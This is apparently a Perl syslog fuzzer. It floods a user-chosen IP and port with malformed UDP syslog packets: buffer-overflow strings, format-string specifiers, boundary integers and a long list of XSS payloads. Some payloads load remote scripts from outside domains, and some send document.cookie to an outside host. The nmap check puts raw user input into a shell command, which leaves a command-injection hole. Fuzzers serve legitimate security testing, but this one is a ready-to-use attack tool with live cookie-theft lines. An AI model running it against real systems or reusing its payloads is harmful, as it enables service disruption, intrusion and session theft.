#!/usr/bin/perl
#syslog Fuzzer v2
#Created by jaime.blasco@aitsec.com
#Modified by Demonalex

use IO::Socket::INET;
use POSIX qw(strftime);

$|=1;

sub evaluation($$){
	die "Nmap.exe does not exist under the nmap folder!\n" if (!(-e "nmap\\nmap.exe"));
	die "Libeay32.dll does not exist under the nmap folder!\n" if (!(-e "nmap\\libeay32.dll"));
	die "Ssleay32.dll does not exist under the nmap folder!\n" if (!(-e "nmap\\ssleay32.dll"));
	die "Nmap-mac-prefixes does not exist under the nmap folder!\n" if (!(-e "nmap\\nmap-mac-prefixes"));
	die "Nmap-os-db does not exist under the nmap folder!\n" if (!(-e "nmap\\nmap-os-db"));
	die "Nmap-payloads does not exist under the nmap folder!\n" if (!(-e "nmap\\nmap-payloads"));
	die "Nmap-protocols does not exist under the nmap folder!\n" if (!(-e "nmap\\nmap-protocols"));
	die "Nmap-rpc does not exist under the nmap folder!\n" if (!(-e "nmap\\nmap-rpc"));
	die "Nmap-service-probes does not exist under the nmap folder!\n" if (!(-e "nmap\\nmap-service-probes"));
	die "Nmap-services does not exist under the nmap folder!\n" if (!(-e "nmap\\nmap-services"));

	$nmap_host=shift;
	$nmap_port=shift;

	$nmap_reply=sprintf(`nmap\\nmap.exe -sU $nmap_host -p $nmap_port`);

	#print $nmap_reply."\n";

	if ($nmap_reply=~/open/){
		#print "$nmap_host:$nmap_port is alive!\n";
		return 1;
	}else{
		#print "$nmap_host:$nmap_port is closed!\n";
		return 0;
	}
}

print "
\t  Syslog Fuzzer v4
";

print "Target IP: ";
$host=<STDIN>;
chop($host);
print "Port(514): ";
$port=<STDIN>;
chop($port);
$port=514 if ($port eq "");

@bfo=(
'A'x5,
'A'x17,
'A'x33,
'A'x65,
'A'x76,
'A'x129,
'A'x257,
'A'x513,
'A'x1024,
'A'x2049,
'A'x4097,
'A'x8193,
'A'x12288,
'A'x65536
);
@fse=(
'%s%p%x%d',
'024d',
'%.2049d',
'%p%p%p%p',
'%x%x%x%x',
'%d%d%d%d',
'%s%s%s%s',
'%99999999999s',
'%08x',
'%%20d',
'%%20n',
'%%20x',
'%%20s',
'%s%s%s%s%s%s%s%s%s%s',
'%p%p%p%p%p%p%p%p%p%p',
'%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%',
'%s'x129,
'%x'x257
);
@int=(
'-1',
'0',
'0x100',
'0x1000',
'0x3fffffff',
'0x7ffffffe',
'0x7fffffff',
'0x80000000',
'0xfffffffe',
'0xffffffff',
'0x10000',
'0x100000',
'65536'
);
@xss = ("<script>alert(\"XSS\")</script>",
"<STYLE>\@im\\port\'\\ja\\vasc\\ript:alert(\"XSS\")\';</STYLE>",
"<style>\@\\im\\port\'\\ja\\vasc\\ript:alert()\';</style>",
"<style>\@\\im\\po\\rt\'\\0ja\\0va\\0sc\\0ri\\0pt:alert()\';</style>",
"<STYLE>\@\\0im\\port\'\\0ja\\vasc\\ript:alert(\"XSS\")\';</STYLE>",
"<STYLE type=\"text\/css\">BODY{background:url(\"javascript:alert(\'XSS\')\")}</STYLE>",
"<STYLE TYPE=\"text\/css\">.XSS{background-image:url(\"javascript:alert(\'XSS\')\");}</STYLE><A CLASS=XSS></A>",
"<marquee onstart=\"alert(\/2\/)\">.<\/marquee>",
"<div style=\"xss:ex\/**\/pre\/**/ssion(alert(\'xss\'))\">",
"<div style=\"xss:ex\/**\/pre\/**\/ssion(eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41)))\">",
"<DIV STYLE=\"width: expression(alert(\'XSS\'));\">",
"<div style=\"background:url(\'javascript:alert(1)\')\">",
"<DIV STYLE=\"background-image: url(javascript:alert(\'XSS\'))\">",
"<div id=\"mycode\" expr=\"alert(\'hah!\')\" style=\"background:url(\'javascript:eval(document.all.mycode.expr)\')\">",
"<div id=\"mycode\" expr=\"alert(\'hah!\')\" style=\"background:url(\'java\\script:eval(document.all.mycode.expr)\')\">",
"<BODY BACKGROUND=\"javascript:alert(\'XSS\')\">",
"<BODY ONLOAD=alert(\'XSS\')>",
"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(\'XSS\');\">",
"<FRAMESET><FRAME src=javascript:alert(\'XSS\')><\/FRAME><\/FRAMESET>",
"<TABLE BACKGROUND=\"javascript:alert(\'XSS\')\">",
"<iframe src=\"vbscript:alert()\">",
"<IFRAME src=javascript:alert(\'XSS\')><\/IFRAME>",
"<IMG STYLE=\'xss:expre\\ssion(alert(\"XSS\"))\'>",
"<img src=\"#\" style=\"Xss:expression(alert(\'xss\'));\">",
"<IMG src=\'vbscript:msgbox(\"XSS\")\'>",
"<IMG DYNsrc=\"javascript:alert(\'XSS\')\">",
"<IMG LOWsrc=\"javascript:alert(\'XSS\')\">",
"<img src=\"javascript:alert(\'3\');\">",
"<img src=\"http:\/\/xss.jpg\" onerror=alert(\'4\')>",
"<img src=\"&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41&#59\">",
"<IMG src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
"<img src=\"&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&#x3b\"> =<img src=\"javascript:alert(\'5\');\">",
"<img STYLE=\"background-image: url(javascript:alert(\'6\'))\">",
"javascript:document.write(\"<script src=http:\/\/www.pc010.cn\/1.js><\/script>\")",
"<img src=\"javascript:alert(\/10\/)\">",
"<img src=\"#\" onerror=alert(\/11\/) >",
"<IMG SRC=\"JAVA&115;CRIPT:ALERT(\'12\');\"><\/IMG>",
"<img src=\"javas&#99;ript:alert(\'XSS\')\">",
"<IMG src=\"jav&#x09;ascript:alert(\'XSS\');\">",
"<IMG src=\"jav&#x0A;ascript:alert(\'XSS\');\">",
"<IMG src=\"jav&#x0D;ascript:alert(\'XSS\');\">",
"javascript:document.write(\'<scri\'+\'pt src=http:\/\/www.hackwolf.cn\/1.txt>\'+\'</scri\'+\'pt>\');",
"[float=expression(alert(\'xss\'))]11[\/float]",
"<TABLE BACKGROUND=javscript:alert(\/xss\/)>",
"<img src=\"jav as cript:alert(\'XSS\');\">",
"<img src=\"&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41&#59\">",
"<img src=\"javascript:window.open(\'http:\/\/wg12.cn\/msg.asp?msg=&#39;+document cookie);\">",
"xss.jpg\" onerror=window.open(\'http:\/\/wg12.cn\/msg.asp?msg=&#39;+&#39;document cookie) width=0>",
"<img src=\"blah\"onmouseover=alert()>",
"<img onmouseover=alert()><\/img>",
"<STYLE>\@im\\port\'\\ja\\vasc\\ript:alert(\"XSS\")\';</STYLE>",
"<img src=\"abc>\" onmouseover=\"[code]\">",
"<SCRIPT a=\">\" SRC=\"xss.js\"><\/SCRIPT>",
"<script>\/*\n*\/alert\/*\n*\/(\"zs\")\/*\n*\/<\/script>",
"<table><tr><td background=\"javascript:alert(\/xss\/)\"><\/tr><\/table>",
"&#104&#116&#116&#112&#58&#47&#47&#120&#115&#115&#46&#106&#112&#103&#34&#32&#111&#110&#101&#114&#114&#111&#114&#61&#97&#108&#101&#114&#116&#40&#39&#52&#39&#41&#62",
"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41>",
"<img onmouseover=alert()><\/img>",
"<STYLE>\@im\\port\'\\ja\\vasc\\ript:eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))\';<\/STYLE>"
);

print "Using host: ".$host."\n";
print "Using port: ".$port."\n";

#http://www.ietf.org/rfc/rfc3164.txt
#udp SYSLOG PACKET looks like:
#<Priority>Header Message text
# Header = Date Hostname PID

$npriority = '<0>';
$ndate = strftime "%b%e %H:%M:%S", localtime;
$nhostname = "10.0.0.2";
$npid = 'fuzzer[10]';
$nmsg = "Syslog Fuzzer v4";

#fuzzing PRI
print "\n"."Fuzzing PRI ...";
#Buffer Overflow
foreach (@bfo) {
    $header = $ndate.' '.$nhostname.' '.$npid;
    $packet = '<'.$_.'>'.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}
    #print $packet;
}
sleep 1;
print "\n"."PRI:Buffer_Overflow is done! Press any key to continue ...";
<STDIN>;

#Format Strings
foreach (@fse) {
    $header = $ndate.' '.$nhostname.' '.$npid;
    $packet = '<'.$_.'>'.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "PRI:Format_Strings is done! Press any key to continue ...";
<STDIN>;

#Integer Overflows
foreach (@int) {
    $header = $ndate.' '.$nhostname.' '.$npid;
    $packet = '<'.$_.'>'.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "PRI:Integer_Overflow is done! Press any key to continue ...";
<STDIN>;

#XSS
foreach (@xss) {
    $header = $ndate.' '.$nhostname.' '.$npid;
    $packet = '<'.$_.'>'.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "PRI:XSS is done! Press any key to continue ...";
<STDIN>;


#fuzzing header
   
    #fuzzing Date
print "Fuzzing Date ...";   
#Buffer Overflow
foreach (@bfo) {
    $header = $_.' '.$nhostname.' '.$npid;
    $packet = $npriority.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "\n"."Date:Buffer_Overflow is done! Press any key to continue ...";
<STDIN>;

#Format Strings
foreach (@fse) {
    $header = $_.' '.$nhostname.' '.$npid;
    $packet = $npriority.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "Date:Format_Strings is done! Press any key to continue ...";
<STDIN>;

#Integer Overflows
foreach (@int) {
    $header = $_.' '.$nhostname.' '.$npid;
    $packet = $npriority.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "Date:Integer_Overflow is done! Press any key to continue ...";
<STDIN>;

#XSS
foreach (@xss) {
    $header = $_.' '.$nhostname.' '.$npid;
    $packet = $npriority.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "Date:XSS is done! Press any key to continue ...";
<STDIN>;


    #fuzzing hostname
print "Fuzzing Hostname ...";   
#Buffer Overflow
foreach (@bfo) {
    $header = $ndate.' '.$_.' '.$npid;
    $packet = $npriority.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "\n"."Hostname:Buffer_Overflow is done! Press any key to continue ...";
<STDIN>;

#Format Strings
foreach (@fse) {
    $header = $ndate.' '.$_.' '.$npid;
    $packet = $npriority.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "Hostname:Format_Strings is done! Press any key to continue ...";
<STDIN>;

#Integer Overflows
foreach (@int) {
    $header = $ndate.' '.$_.' '.$npid;
    $packet = $npriority.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "Hostname:Integer_Overflow is done! Press any key to continue ...";
<STDIN>;

#XSS
foreach (@xss) {
    $header = $ndate.' '.$_.' '.$npid;
    $packet = $npriority.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}
    #print $packet;
}
sleep 1;
print "Hostname:XSS is done! Press any key to continue ...";
<STDIN>;


    #fuzzing PID
print "Fuzzing PID ...";   
#Buffer Overflow
foreach (@bfo) {
    $header = $ndate.' '.$nhostname.' '.$_;
    $packet = $npriority.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "\n"."PID:Buffer_Overflow is done! Press any key to continue ...";
<STDIN>;

#Format Strings
foreach (@fse) {
    $header = $ndate.' '.$nhostname.' '.$_;
    $packet = $npriority.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "PID:Format_Strings is done! Press any key to continue ...";
<STDIN>;

#Integer Overflows
foreach (@int) {
    $header = $ndate.' '.$nhostname.' '.$_;
    $packet = $npriority.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "PID:Integer_Overflow is done! Press any key to continue ...";
<STDIN>;

#XSS
foreach (@xss) {
    $header = $ndate.' '.$nhostname.' '.$_;
    $packet = $npriority.$header.': '.$nmsg;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "PID:XSS is done! Press any key to continue ...";
<STDIN>;


#fuzzing msg
print "Fuzzing MSG ...";   
#Buffer Overflow
foreach (@bfo) {
    $header = $ndate.' '.$nhostname.' '.$npid;
    $packet = $npriority.$header.': '.$_;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "\n"."MSG:Buffer_Overflow is done! Press any key to continue ...";
<STDIN>;

#Format Strings
foreach (@fse) {
    $header = $ndate.' '.$nhostname.' '.$npid;
    $packet = $npriority.$header.': '.$_;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "MSG:Format_Strings is done! Press any key to continue ...";
<STDIN>;

#Integer Overflows
foreach (@int) {
    $header = $ndate.' '.$nhostname.' '.$npid;
    $packet = $npriority.$header.': '.$_;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
print "MSG:Integer_Overflow is done! Press any key to continue ...";
<STDIN>;

#XSS
foreach (@xss) {
    $header = $ndate.' '.$nhostname.' '.$npid;
    $packet = $npriority.$header.': '.$_;
	$con=new IO::Socket::INET->new(PeerPort=>$port, Proto=>'udp', PeerAddr=>$host);
    $con->send($packet);
	$con->close;
	if (evaluation($host, $port) != 1){
		print "\n"."*****************************"."\n";
		print "$packet"."\n";
		print "\n"."*****************************"."\n";
		print "Press any key to continue ...";
		<STDIN>;
	}	
    #print $packet;
}
sleep 1;
print "MSG:XSS is done! Press any key to continue ...";
<STDIN>;


print "\n"."Done!\n";
exit(0);